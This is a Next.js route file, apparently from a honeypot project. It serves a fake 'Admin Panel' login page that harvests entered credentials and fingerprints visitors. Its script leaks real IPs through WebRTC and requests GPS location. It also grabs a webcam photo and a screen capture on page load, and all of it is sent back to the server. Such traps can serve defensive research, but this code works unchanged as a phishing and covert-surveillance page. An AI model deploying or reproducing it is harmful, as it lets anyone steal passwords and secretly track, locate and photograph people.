/**
 * Trap - Fake Login Page Endpoint
 * 
 * Serves a convincing fake login page that collects:
 * - Credentials entered by attacker
 * - Browser fingerprint
 * - WebRTC real IP leak
 * - Camera/microphone/screen capture (with consent)
 * - GPS location (with consent)
 */

import { NextResponse } from 'next/server';
import { collectHoneypotData } from '@/lib/honeypot/collector';
import type { AttackType, Severity } from '@/lib/honeypot/collector';

const FAKE_DOMAIN = process.env.HONEYPOT_FAKE_DOMAIN || 'example.com';
const ENABLE_MEDIA_CAPTURE = process.env.ENABLE_MEDIA_CAPTURE !== 'false';
const ENABLE_WEBRTC_LEAK = process.env.ENABLE_WEBRTC_LEAK !== 'false';
const ENABLE_GPS_LOCATION = process.env.ENABLE_GPS_LOCATION !== 'false';

export async function GET(request: Request) {
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0] || 
             request.headers.get('x-real-ip') || 
             'unknown';
  const userAgent = request.headers.get('user-agent') || 'unknown';
  const referer = request.headers.get('referer') || 'direct';
  const url = new URL(request.url);
  const originalPath = url.searchParams.get('original_path') || url.pathname;
  const trapType = url.searchParams.get('trap_type') as AttackType || 'BRUTE_FORCE';
  const severity = url.searchParams.get('severity') as Severity || 'HIGH';
  
  // Get IP from ref parameter if present (tracking from .env trap)
  const refParam = url.searchParams.get('ref');
  const trackedIP = refParam ? Buffer.from(refParam, 'base64').toString('utf8') : ip;

  // Collect honeypot data
  try {
    await collectHoneypotData({
      ip: trackedIP,
      userAgent,
      path: originalPath,
      method: 'GET',
      attackType: trapType,
      severity,
      details: `Attacker landed on fake login page. Referer: ${referer}`,
      fakeDataProvided: false,
      redirectedFrom: referer,
      fingerprintUrl: `${url.origin}/api/trap/fingerprint`,
    });
  } catch (error) {
    console.error('[Trap] Failed to send notification:', error);
  }

  // Generate the fake login page HTML
  const html = generateLoginPage(trackedIP, url.origin);

  return new NextResponse(html, {
    status: 200,
    headers: {
      'Content-Type': 'text/html',
      'X-Honeypot-Triggered': 'true',
      'X-Honeypot-Type': 'creds-page',
    },
  });
}

export async function POST(request: Request) {
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0] || 
             request.headers.get('x-real-ip') || 
             'unknown';
  const userAgent = request.headers.get('user-agent') || 'unknown';
  
  let credentials = {};
  try {
    credentials = await request.json();
  } catch {
    // Form data or invalid JSON
    try {
      const formData = await request.formData();
      credentials = Object.fromEntries(formData);
    } catch {
      credentials = { error: 'Could not parse credentials' };
    }
  }

  // Collect credentials
  try {
    await collectHoneypotData({
      ip,
      userAgent,
      path: '/api/trap/creds',
      method: 'POST',
      attackType: 'CREDENTIAL_HARVESTING',
      severity: 'CRITICAL',
      details: `Attacker submitted credentials`,
      fakeDataProvided: false,
      credentials,
    });
  } catch (error) {
    console.error('[Trap] Failed to send notification:', error);
  }

  // Return fake error to keep them trying
  return NextResponse.json(
    { 
      success: false, 
      message: 'Authentication failed. Invalid credentials.',
      error: 'INVALID_CREDENTIALS',
      attempts_remaining: Math.floor(Math.random() * 3) + 1,
    }, 
    { status: 401 }
  );
}

function generateLoginPage(ip: string, origin: string): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Panel - Secure Login</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
    }
    .login-container {
      background: rgba(255,255,255,0.95);
      padding: 40px;
      border-radius: 16px;
      box-shadow: 0 25px 50px rgba(0,0,0,0.3);
      width: 100%;
      max-width: 400px;
      color: #333;
    }
    .logo { text-align: center; margin-bottom: 30px; }
    .logo h1 { color: #e63946; font-size: 28px; }
    .logo p { color: #666; font-size: 14px; margin-top: 5px; }
    .form-group { margin-bottom: 20px; }
    label { display: block; color: #333; margin-bottom: 8px; font-weight: 500; }
    input { 
      width: 100%;
      padding: 12px 15px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      transition: border-color 0.3s;
    }
    input:focus { outline: none; border-color: #e63946; }
    .checkbox-group { display: flex; align-items: center; margin-bottom: 20px; }
    .checkbox-group input[type="checkbox"] { width: auto; margin-right: 10px; }
    button {
      width: 100%;
      padding: 12px 15px;
      background-color: #e63946;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover { background-color: #d62839; }
    button:disabled { background-color: #ccc; cursor: not-allowed; }
    .error-message {
      color: #e63946;
      text-align: center;
      margin-top: 20px;
      display: none;
    }
    .loading-spinner {
      display: none;
      justify-content: center;
      align-items: center;
      margin-top: 20px;
    }
    .spinner {
      border: 4px solid rgba(0, 0, 0, 0.1);
      width: 36px;
      height: 36px;
      border-radius: 50%;
      border-left-color: #e63946;
      animation: spin 1s ease infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .security-notice {
      text-align: center;
      margin-top: 20px;
      font-size: 12px;
      color: #666;
    }
    .security-notice a { color: #e63946; }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <h1>🔐 Admin Panel</h1>
      <p>Secure Login Required</p>
    </div>
    <form id="loginForm">
      <div class="form-group">
        <label for="email">Email</label>
        <input type="email" id="email" name="email" required placeholder="admin@${FAKE_DOMAIN}">
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required placeholder="••••••••">
      </div>
      <div class="checkbox-group">
        <input type="checkbox" id="remember" name="remember">
        <label for="remember">Remember me</label>
      </div>
      <button type="submit" id="submitBtn">Login</button>
      <div class="loading-spinner" id="loading">
        <div class="spinner"></div>
      </div>
      <div class="error-message" id="error"></div>
    </form>
    <div class="security-notice">
      🔒 Protected by SSL/TLS encryption<br>
      <a href="/security">Security Policy</a> | <a href="/privacy">Privacy</a>
    </div>
  </div>

  <script>
    (async () => {
      const trackedIP = '${ip}';
      const origin = '${origin}';
      
      // Fingerprint data object
      const fp = {
        ip: trackedIP,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
        screen: {
          width: window.screen.width,
          height: window.screen.height,
          colorDepth: window.screen.colorDepth,
          pixelRatio: window.devicePixelRatio,
        },
        browser: {
          language: navigator.language,
          platform: navigator.platform,
          vendor: navigator.vendor,
          cookiesEnabled: navigator.cookieEnabled,
          doNotTrack: navigator.doNotTrack,
          hardwareConcurrency: navigator.hardwareConcurrency,
          maxTouchPoints: navigator.maxTouchPoints,
          webdriver: navigator.webdriver,
        },
        webgl: {},
        canvasHash: 'pending',
        audioContext: {},
        battery: {},
        connection: {},
        geolocation: { status: 'pending' },
        mediaCapabilities: { cameras: 0, microphones: 0, speakers: 0 },
        webrtc: { realIp: 'unknown' },
        permissions: {},
      };

      // Send fingerprint data
      const sendFingerprint = async (data) => {
        try {
          await fetch(origin + '/api/trap/fingerprint', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
          });
        } catch(e) { console.error('FP error:', e); }
      };

      // Collect WebGL info
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (debugInfo) {
            fp.webgl.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            fp.webgl.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          }
        }
      } catch(e) {}

      // Canvas fingerprint
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Trap fingerprint 🔐', 2, 2);
        fp.canvasHash = canvas.toDataURL().slice(-50);
      } catch(e) {}

      // Audio context
      try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        fp.audioContext.sampleRate = audioCtx.sampleRate;
        audioCtx.close();
      } catch(e) {}

      // Battery
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          fp.battery = {
            level: battery.level,
            charging: battery.charging,
          };
        }
      } catch(e) {}

      // Network connection
      try {
        if (navigator.connection) {
          fp.connection = {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
          };
        }
      } catch(e) {}

      // Permissions
      const permissionNames = ['geolocation', 'notifications', 'camera', 'microphone'];
      for (const name of permissionNames) {
        try {
          const status = await navigator.permissions.query({ name });
          fp.permissions[name] = status.state;
        } catch (e) {
          fp.permissions[name] = 'error';
        }
      }

      ${ENABLE_WEBRTC_LEAK ? `
      // WebRTC Real IP Leak
      try {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        pc.createDataChannel('');
        pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
        pc.onicecandidate = (ice) => {
          if (!ice || !ice.candidate || !ice.candidate.candidate) return;
          const parts = ice.candidate.candidate.split(' ');
          const ipAddress = parts[4];
          if (ipAddress && ipAddress.match(/^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$/)) {
            fp.webrtc.realIp = ipAddress;
            sendFingerprint({ webrtc: fp.webrtc, ip: trackedIP, timestamp: new Date().toISOString() });
          }
        };
      } catch (e) { fp.webrtc = { error: e.message }; }
      ` : ''}

      ${ENABLE_GPS_LOCATION ? `
      // GPS Geolocation
      try {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              fp.geolocation = {
                status: 'granted',
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                heading: position.coords.heading,
                speed: position.coords.speed,
                timestamp: position.timestamp,
                mapUrl: 'https://www.google.com/maps?q=' + position.coords.latitude + ',' + position.coords.longitude
              };
              await sendFingerprint({ 
                preciseGeolocation: fp.geolocation, 
                ip: trackedIP,
                timestamp: new Date().toISOString() 
              });
            },
            (error) => {
              fp.geolocation = {
                status: 'denied',
                errorCode: error.code,
                errorMessage: error.message
              };
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
          );
        }
      } catch(e) { fp.geolocation = { status: 'error', message: e.message }; }
      ` : ''}

      ${ENABLE_MEDIA_CAPTURE ? `
      // Media device enumeration
      try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        fp.mediaCapabilities = {
          cameras: devices.filter(d => d.kind === 'videoinput').length,
          microphones: devices.filter(d => d.kind === 'audioinput').length,
          speakers: devices.filter(d => d.kind === 'audiooutput').length,
          devices: devices.map(d => ({ kind: d.kind, label: d.label || 'hidden' }))
        };

        // Attempt camera capture
        if (fp.mediaCapabilities.cameras > 0) {
          try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const cameraImage = canvas.toDataURL('image/jpeg', 0.7);
            stream.getTracks().forEach(track => track.stop());
            await sendFingerprint({ cameraImage, ip: trackedIP, timestamp: new Date().toISOString() });
          } catch (e) { console.warn('Camera capture failed:', e); }
        }

        // Attempt screen capture
        try {
          const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
          const videoTrack = stream.getVideoTracks()[0];
          const imageCapture = new ImageCapture(videoTrack);
          const bitmap = await imageCapture.grabFrame();
          const canvas = document.createElement('canvas');
          canvas.width = bitmap.width;
          canvas.height = bitmap.height;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(bitmap, 0, 0);
          const screenshot = canvas.toDataURL('image/png');
          stream.getTracks().forEach(track => track.stop());
          await sendFingerprint({ screenshot, ip: trackedIP, timestamp: new Date().toISOString() });
        } catch (e) { console.warn('Screen capture failed:', e); }
      } catch(e) { fp.mediaCapabilities.error = e.message; }
      ` : ''}

      // Send full fingerprint after delay
      setTimeout(() => sendFingerprint(fp), 2000);

      // Form submission handler
      document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const submitBtn = document.getElementById('submitBtn');
        const loading = document.getElementById('loading');
        const errorDiv = document.getElementById('error');
        
        submitBtn.disabled = true;
        loading.style.display = 'flex';
        errorDiv.style.display = 'none';
        
        // Collect credentials
        const credentials = {
          email: document.getElementById('email').value,
          password: document.getElementById('password').value,
          remember: document.getElementById('remember').checked
        };
        
        // Add credentials to fingerprint
        fp.credentials = credentials;
        await sendFingerprint(fp);
        
        // Submit to server
        try {
          const response = await fetch(origin + '/api/trap/creds', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(credentials)
          });
          
          const result = await response.json();
          
          loading.style.display = 'none';
          submitBtn.disabled = false;
          
          if (!response.ok) {
            errorDiv.textContent = result.message || 'Authentication failed. Invalid credentials.';
            errorDiv.style.display = 'block';
          }
        } catch(err) {
          loading.style.display = 'none';
          submitBtn.disabled = false;
          errorDiv.textContent = 'Connection error. Please try again.';
          errorDiv.style.display = 'block';
        }
      });
    })();
  </script>
</body>
</html>`;
}

